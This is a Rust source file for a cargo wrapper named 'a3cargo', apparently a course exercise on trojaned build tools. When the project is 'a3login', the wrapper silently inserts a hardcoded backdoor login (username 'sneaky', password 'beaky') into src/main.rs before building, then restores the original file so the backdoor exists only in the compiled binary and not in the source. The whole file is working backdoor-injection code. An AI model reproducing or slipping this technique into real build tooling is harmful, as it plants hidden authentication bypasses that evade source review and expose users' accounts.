use std::{
    env,
    fs,
    io::{self, Write},
    process::{Command, exit},
};

fn main() {
    // Check if the command is "build" or "run"
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: a3cargo <build|run> [args]");
        exit(1);
    }
    
    let command = &args[1];
    let project_name = env::current_dir().unwrap().file_name().unwrap().to_str().unwrap();

    // Only modify if the project is "a3login"
    if project_name == "a3login" {
        let a3login_path = "src/main.rs";  // Assuming main.rs is in src folder
        let backup_path = "src/main_backup.rs";

        // Step 1: Backup the original a3login file
        if let Err(e) = fs::copy(a3login_path, backup_path) {
            eprintln!("Failed to back up main.rs: {}", e);
            exit(1);
        }

        // Step 2: Inject the hidden user credential
        if let Err(e) = inject_hidden_user(a3login_path) {
            eprintln!("Failed to modify main.rs: {}", e);
            restore_original(a3login_path, backup_path);
            exit(1);
        }

        // Step 3: Run the specified cargo command
        if !run_cargo_command(command, &args[2..]) {
            eprintln!("Cargo command failed.");
            restore_original(a3login_path, backup_path);
            exit(1);
        }

        // Step 4: Restore the original a3login source code
        if let Err(e) = restore_original(a3login_path, backup_path) {
            eprintln!("Failed to restore original main.rs: {}", e);
            exit(1);
        }
    } else {
        // If not a3login, run the command without modifications
        if !run_cargo_command(command, &args[2..]) {
            eprintln!("Cargo command failed.");
            exit(1);
        }
    }
}

// Injects a hidden user into the a3login source file
fn inject_hidden_user(a3login_path: &str) -> io::Result<()> {
    let mut content = fs::read_to_string(a3login_path)?;

    // Code to add the hidden user credential check
    let injected_code = r#"
        if login_input.username.trim() == "sneaky" && login_input.password.trim() == "beaky" {
            println!("Access granted!");
            return Ok(());
        }
    "#;

    // Insert the injected code into the main login function
    if let Some(pos) = content.find("for result in rdr.records()") {
        content.insert_str(pos, injected_code);
    } else {
        eprintln!("Failed to locate login verification code in main.rs.");
        return Err(io::Error::new(io::ErrorKind::Other, "Injection point not found"));
    }

    fs::write(a3login_path, content)
}

// Runs the specified cargo command (either build or run with arguments)
fn run_cargo_command(command: &str, args: &[String]) -> bool {
    let mut cmd = Command::new("cargo");
    cmd.arg(command).args(args);

    let status = cmd.status().expect("Failed to execute cargo command.");
    status.success()
}

// Restores the original a3login source file
fn restore_original(a3login_path: &str, backup_path: &str) -> io::Result<()> {
    fs::copy(backup_path, a3login_path)?;
    fs::remove_file(backup_path)?;
    Ok(())
}
